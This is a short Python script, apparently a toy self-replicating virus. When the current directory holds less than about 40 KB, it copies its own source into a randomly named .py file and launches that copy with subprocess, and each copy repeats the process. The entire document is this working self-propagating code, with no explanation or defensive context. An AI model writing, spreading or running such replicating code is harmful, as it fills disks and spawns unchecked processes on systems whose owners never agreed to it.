import random,subprocess,os

def get_size():
	total = 0
	for dirpath, dirnames, filenames in os.walk('.'):
		for f in filenames:
			fp = os.path.join(dirpath, f)
			total += os.path.getsize(fp)
	return total

if get_size() < 40960 :
	handler = open(__file__).read()
	new_name = str(random.randint(1,1000000))
	with open(new_name+'.py','w') as f:
    		f.write(handler)

	new_file = '{}.py'.format(new_name)
	process = subprocess.Popen(["python", new_file], shell=False)